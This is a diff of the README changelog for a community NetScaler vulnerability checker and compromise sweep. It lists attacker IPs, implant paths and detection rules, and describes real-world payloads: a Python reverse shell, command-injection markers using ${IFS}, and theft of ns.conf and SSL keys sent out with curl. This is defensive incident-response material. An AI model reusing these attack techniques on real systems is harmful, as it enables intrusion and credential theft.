+  - **Fewer false alarms:** the tunnel-process check (`python` with `base64`) skips the checker's own `grep`/`perl`/`sh`/`awk`/`sed` processes, so two checkers running at the same time (e.g. a Console job and a manual run) no longer report each other as COMPROMISED.
+  - **Brand-new appliance stays green (field case: a new VPX on 14.1-73.41, no config, no internet, showed six [CHECK] lines):**
+    - **Short logs:** when every kernel in `/flash` and every build in `/var/nsinstall` has the fix, and no log, `nslog` file or saved `ns.conf` is older than the fixed kernel (3-hour margin), the box never ran a vulnerable build: "ns.log has no rotated files" / "keeps only ~25 hours" become one `[OK]`. One older log line or saved config, or one vulnerable kernel, brings the CHECKs back.
+    - **Image and EULA rewrites:** 10 or more web files in 2 or more folders written within 60 seconds, or 80% or more of the files of one type in a folder (at least 5, e.g. 12 of 13 EULA language files), count as a system/theme rewrite. Their content is still checked; only a clean result changes from `[CHECK]` to `[OK]`. A changed `.php` stays red.
+    - **NetScaler's own Perl:** `themes/EULA/eula_upgrade.pl`, the PAR cache of the GSLB sync (`/var/tmp/par-<hex>/cache-<hex>/`: `main.pl`, `syncgslbconfig.pl`, `GslbSync.pm`), `/var/perl5/` and Perl in the logon folders written by the same rewrite as the web files around it are no longer listed.
+  - **LevelBlue THOR (customsnmpd reverse shell):** `main.py` overwrites `/var/python/bin/customsnmpd` with a small Python reverse shell to 45.141.21.130:443. That IP in the file = **COMPROMISED**; code in it that connects out and hands over a shell (`connect(` with `pty.spawn` or `dup2(...fileno`, plus `/bin/sh`) = `[CHECK]`. `whoami` and `tar` added to the command words searched in `ns.log` / `nsvpn.log`. All other indicators in LevelBlue's report (sources, payload hosts, hashes, `sec_monitor`, `/bin/sh` 6555, `.local_journal`, the httpd alias, `insight-new.js`, `xua.html`, `update_result_*.tgz`) were already covered since v1.10.
+  - **Plain-language summary under "Exploitation traffic":** whether any webshell request found a file ("All 12 webshell request(s) were answered 404 - none of these webshell files exists on this box", or which ones got 200/206), and how many of the BEFORE-fix lines come from GreyNoise-tagged scanners. When all BEFORE-fix lines are scanner traffic, the "may have run" note is left out; other BEFORE-fix requests (up to 5) are printed right under the summary, so they are never hidden by a long list. A saved report (`--out`, `--summary`) contains the full "Exploitation traffic" list; on screen it is cut at 40 lines. The section stays red; the summary only explains it. Line counts in its heading now count each log line once, even when it is listed in two groups. The stock 1-byte `nsepa.deb` pre-check is not counted as a webshell request.
+  - **IP Reputation tip, more precise:** besides finding responder / WAF policies that use IP Reputation, the Hardening section now checks in the saved config that the features they need are enabled (Reputation, plus Responder or AppFw) and that each policy is bound to a vserver or globally. Missing parts are shown with the command to fix them; when everything is in place it shows `[OK]` with where the policy is bound. The licence is not checked (that needs the CLI); the line shows `nscli -c "show ns license" | grep -i reputation`. It never changes the verdict.
+  - **Which appliance:** the header now has a second line, `Appliance: <host>  -  NSIP <ip>  -  config <file>  -  <time>`, so a screenshot or report always shows which node it came from (HA pairs, new boxes all called "ns"). The NSIP is read from `set ns config -IPAddress` in the checked config, so it also works for an exported config. `--summary` adds `nsip=` to the result line. `--hide-ip` shows `hidden` instead, for screenshots and reports you share. The first header line is unchanged.
+  - **Start banner:** a small banner when you run it by hand in a terminal: "NetScaler" in green ASCII letters, next to it **CVE CHECK + IoC SWEEP** ("am I fixed? / was I hacked?"), the version, indicator date and GitHub link. It fits an 80-column window. It goes to stderr, so it is never part of a saved report, and it is skipped for `--summary`, `--out`, pipes, Console jobs and with `--no-banner`.
+  - **Production HA pair (7 October):** NetScaler's own `/netscaler/cfdgetstream`, a helper the web GUI starts for a moment as `nobody`, is no longer listed as an unexpected `nobody` process (only when the file is owned by root and not writable by group or others). When `httpd.conf` changed within 5 minutes of a packet-engine restart, the report now says so on the `httpd.conf` line ("together with a packet-engine restart at …"); both stay a `[CHECK]`, because a restart can also be a CVE-2026-88772 crash.
+  - **Huntback.io (7 October, ten days of decoy telemetry):** 16 more attacker IPs, and four addresses moved from the scanner group to the attacker IPs because Huntback shows them injecting commands (172.247.44.85, 23.234.74.48, 176.65.148.54, 137.220.53.135). Several are Tor exits: on their own they only count as "targeted". The tunnel services `pinggy.net` and `serveousercontent.com` added as domains. **Compromise:** the `ns_helper` implant (`/var/vpn/ns_helper`, `/nsconfig/.ns_helper`), the dropper stage `/tmp/.p` and any hidden `.php` file in the web folders (e.g. `LogonPoint/custom/.x.php`). `Nx_*.html` counts as a payload canary like `nx_verify.html`; `ns_helper`, `free.pinggy.net`, `serveousercontent.com` and `/Nx_*.html` count as exploit strings. The `fefypa:` / `fdylo9:` log-channel tags were already caught by the base64 User-Agent check. **New targeted check:** the attack text (`pitboss` / `unexpectedly died` / `NSPPE` with `;` or `${IFS}`) in **any** HTTP request, also a GET with the payload in the User-Agent; before, only the five login pages and `ns.log` were searched (Huntback: 14 injections came in the User-Agent, incl. the ns.conf copy). The files these requests try to write, including the target of `cp` / `mv`, are checked like those from `ns.log`: if one exists, the verdict is COMPROMISED. `NX_*.html` and `Nx_*.html` are matched regardless of case.
+  - **Beazley Security Labs (BSL-A1216, updated 4 October; via Gotham Technology Group):** three exploit-delivery servers added (104.207.47.54, 104.207.46.202, 104.207.32.77). **Gotham Technology Group (shared with permission):** four more SLAPSHOT / WHIPSHOT kit hashes. **Totals: 131 attacker IPs, 17 domains, 38 hashes.**
+  - **New compromise check:** a `.deb` file in the login-page theme folder (`LogonPoint/custom`, `logon/themes`), where SLAPSHOT keeps a webshell as `receiver.deb`. The theme folder never holds packages of its own.
 - **v1.14** (2026-10-06): **config and SSL-key theft payload.**
   - **New compromise check:** a payload seen in the field writes `ns.conf` and every `/nsconfig/ssl/*.key` (marked `===CONF:` / `===KEY:`) into a random 6-character `.css` in `/var/netscaler/logon/LogonPoint`, sends it with `curl --data-binary` to port 8877 and then downloads the `.css`. Any file in the web folders holding config dumps or private keys is now reported as a compromise, with the advice to rotate all keys, certificates and passwords.
   - **Pick-up requests:** requests for a random 6-character `.css` directly in `/logon/LogonPoint/` are listed (404 = the file was never written, the attempt failed); an HTTP 200 is reported as a compromise (the file was downloaded).
@@ -525,7 +647,13 @@ To prevent it, upload in **binary** mode in WinSCP, or clone and download from G
 
 ---
 
-## Support this project
+## Contributing
+
+Found a false alarm, a missed indicator or a better way to detect something? Open an issue or a pull request. Please leave out customer names, hostnames, IP addresses, credentials and indicators from an incident that is still open.
+
+---
+
+## ❤️ Support this project
 
 This tool is free and will stay free. If it saved you time, you can say thanks with a voluntary contribution — completely optional:
 
@@ -537,6 +665,10 @@ For larger contributions or if you need an invoice, contact me at [thomas@poppel
 
 ## Disclaimer
 
-This is an independent community tool. It is **not** affiliated with, endorsed by or supported by Cloud Software Group / Citrix. It is provided as is, without warranty. It is read-only and makes no changes to the appliance. The Citrix security bulletin is the authoritative source. Always verify the results against it, and involve experienced forensic investigators if you suspect a compromise.
+An independent community tool, **not** affiliated with, endorsed by or supported by Cloud Software Group / Citrix. Provided as is, without warranty. It is read-only, but read it before you run it, and use it only on appliances you own or are authorised to check.
+
+A clean run is not proof that an appliance was never compromised: the checker only knows what has been published so far. The Citrix security bulletin is the authoritative source. Weigh the results together with the official Citrix IoC scan and your firewall and DNS logs. If you suspect a compromise, preserve evidence first and involve experienced incident responders.
+
+Questions or a suspected compromise? Contact [thomas@poppelgaard.com](mailto:thomas@poppelgaard.com).
 
 Author: **Thomas Poppelgaard**, [Poppelgaard.com ApS](https://www.poppelgaard.com)
